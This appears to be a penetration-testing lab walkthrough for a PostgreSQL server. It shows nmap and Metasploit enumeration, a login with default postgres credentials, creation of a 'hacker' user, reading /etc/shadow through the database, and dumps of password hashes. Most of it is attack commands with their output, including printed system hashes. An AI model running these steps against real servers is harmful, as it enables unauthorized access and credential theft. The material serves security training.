# PostgreSQL recon basics

## Scanning Postgres version

nmap -sV wont give us the version number here

```
nmap -sV 192.30.225.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-28 08:31 UTC
Nmap scan report for target-1 (192.30.225.3)
Host is up (0.000015s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.70%I=7%D=3/28%Time=60603EDE%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,85,"E\0\0\0\x84SFATAL\0C0A000\0Munsupported\x20frontend\x20pro
SF:tocol\x2065363\.19778:\x20server\x20supports\x201\.0\x20to\x203\.0\0Fpo
SF:stmaster\.c\0L2014\0RProcessStartupPacket\0\0");
MAC Address: 02:42:C0:1E:E1:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

Use metasploit

```
msf5 > use auxiliary/scanner/postgres/postgres_version
msf5 auxiliary(scanner/postgres/postgres_version) > set RHOSTS 192.30.225.3
RHOSTS => 192.30.225.3
msf5 auxiliary(scanner/postgres/postgres_version) > run

[*] 192.30.225.3:5432 Postgres - Version PostgreSQL 9.5.14 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609, 64-bit (Post-Auth)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Check databases present

```
msf5 auxiliary(scanner/postgres/postgres_version) > use auxiliary/scanner/postgres/postgres_schemadump
msf5 auxiliary(scanner/postgres/postgres_schemadump) > set RHOSTS 192.30.225.3
RHOSTS => 192.30.225.3
msf5 auxiliary(scanner/postgres/postgres_schemadump) > run

[+] Postgres SQL Server Schema 
 Host: 192.30.225.3 
 Port: 5432 
 ====================

---
- DBName: employee
  Tables:
  - TableName: company
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'
    - ColumnName: name
      ColumnType: text
      ColumnLength: "-1"
    - ColumnName: age
      ColumnType: int4
      ColumnLength: '4'
    - ColumnName: address
      ColumnType: bpchar
      ColumnLength: "-1"
    - ColumnName: salary
      ColumnType: float4
      ColumnLength: '4'
    - ColumnName: join_date
      ColumnType: date
      ColumnLength: '4'
  - TableName: company_pkey
    Columns:
    - ColumnName: id
      ColumnType: int4
      ColumnLength: '4'
- DBName: data
  Tables: []
- DBName: storage
  Tables: []
- DBName: adminzone
  Tables: []
- DBName: junk
  Tables: []

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Create databases using metasploit

```
msf5 auxiliary(scanner/postgres/postgres_schemadump) > use auxiliary/admin/postgres/postgres_sql
msf5 auxiliary(admin/postgres/postgres_sql) > set RHOSTS 192.30.225.3
RHOSTS => 192.30.225.3
msf5 auxiliary(admin/postgres/postgres_sql) > set SQL CREATE USER hacker;
SQL => CREATE USER hacker;
msf5 auxiliary(admin/postgres/postgres_sql) > set VERBOSE true
VERBOSE => true
msf5 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 192.30.225.3

[+] 192.30.225.3:5432 Postgres - Logged in to 'template1' with 'postgres':'postgres'
[*] 192.30.225.3:5432 Postgres - querying with 'CREATE USER hacker;'
[*] 192.30.225.3:5432 Rows Returned: 0
[+] 192.30.225.3:5432 Postgres - Command complete.
[*] 192.30.225.3:5432 Postgres - Disconnected
[*] Auxiliary module execution completed
```

## Search system password hash

```
msf5 auxiliary(admin/postgres/postgres_sql) > use auxiliary/admin/postgres/postgres_readfile                                                                                      
msf5 auxiliary(admin/postgres/postgres_readfile) > set RHOSTS 192.30.225.3              
RHOSTS => 192.30.225.3                                                                                      
msf5 auxiliary(admin/postgres/postgres_readfile) > set RFILE /etc/shadow
RFILE => /etc/shadow       
msf5 auxiliary(admin/postgres/postgres_readfile) > run                                         
[*] Running module against 192.30.225.3    
                                                                                                
Query Text: 'CREATE TEMP TABLE PKdSbhp (INPUT TEXT);                 
      COPY PKdSbhp FROM '/etc/shadow';
      SELECT * FROM PKdSbhp'                                             
========================================================================================================================
...

root:$6$E.57HGNv$KYZB3XgeCZriVbuWltZFYF0yUlt7WPunkMqfY44tPGWc1GMjcD5QGfZ4Ztg85BRm3ylTYJoigyvpcNnsb1Rjh/:17861:0:99999:7:::                                                        
daemon:*:17848:0:99999:7:::                                                                                                                                                       
bin:*:17848:0:99999:7:::                                                                                                                                                          
sys:*:17848:0:99999:7:::                                                                                                                                                          
sync:*:17848:0:99999:7:::
games:*:17848:0:99999:7:::                                
man:*:17848:0:99999:7:::                                                                                                                                                          
lp:*:17848:0:99999:7:::                                                                 
mail:*:17848:0:99999:7:::                                                                                   
news:*:17848:0:99999:7:::                                               
uucp:*:17848:0:99999:7:::  
proxy:*:17848:0:99999:7:::                                                                     
www-data:*:17848:0:99999:7:::              
backup:*:17848:0:99999:7:::                                                                     
list:*:17848:0:99999:7:::                                            
irc:*:17848:0:99999:7:::              
gnats:*:17848:0:99999:7:::                                               
nobody:*:17848:0:99999:7:::                                                                                                                                                       
systemd-timesync:*:17848:0:99999:7:::                         
systemd-network:*:17848:0:99999:7:::
systemd-resolve:*:17848:0:99999:7:::             
systemd-bus-proxy:*:17848:0:99999:7:::                                                                                                                                            
_apt:*:17848:0:99999:7:::                                                                                                                                                         
postgres:*:17860:0:99999:7:::                                                       
dbadministrator:$6$cTu2w4ZQ$B735QF1wLcP07bEhgotlCnKZMkacKV1KAhcJfE8RCzUcGjd2WHmUwJf5Ru3mDXWD960rwSO96ToWOMzEATiJy1:17861:0:99999:7:::
[+] 192.30.225.3:5432 Postgres - /etc/shadow saved in /root/.msf4/loot/20210328083613_default_192.30.225.3_postgres.file_564660.txt      
[*] Auxiliary module execution completed
```

## List database users and their password hashes

```
msf5 auxiliary(admin/postgres/postgres_readfile) > use auxiliary/scanner/postgres/postgres_hashdump
msf5 auxiliary(scanner/postgres/postgres_hashdump) > set RHOSTS 192.30.225.3
RHOSTS => 192.30.225.3
msf5 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username  Hash
 --------  ----
 dav       md52c91aab2f10da51700e18f7e4c359900
 jack      md5b06a9f355bd8a004b404dc06e86a5ab6
 jackson   md5c0f8eaebe9735029bb1553f670f01acf
 peter     md5c991abdff30a5aada65694f199f0416a

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## List databases using interactive psql client

```
root@attackdefense:~# psql -h 192.30.225.3 -U postgres
psql (11.2 (Debian 11.2-2), server 9.5.14)
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                             List of databases
   Name    |  Owner   | Encoding  | Collate | Ctype |   Access privileges   
-----------+----------+-----------+---------+-------+-----------------------
 adminzone | postgres | SQL_ASCII | C       | C     | 
 data      | postgres | SQL_ASCII | C       | C     | 
 employee  | postgres | SQL_ASCII | C       | C     | 
 junk      | postgres | SQL_ASCII | C       | C     | 
 postgres  | postgres | SQL_ASCII | C       | C     | 
 storage   | postgres | SQL_ASCII | C       | C     | 
 template0 | postgres | SQL_ASCII | C       | C     | =c/postgres          +
           |          |           |         |       | postgres=CTc/postgres
 template1 | postgres | SQL_ASCII | C       | C     | =c/postgres          +
           |          |           |         |       | postgres=CTc/postgres
(8 rows)
```

## Find number of records in table 'company' in database 'employee'

```
postgres=# \c employee
psql (11.2 (Debian 11.2-2), server 9.5.14)
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
You are now connected to database "employee" as user "postgres".
employee=# select count(*) from company;
 count 
-------
     9
(1 row)
```

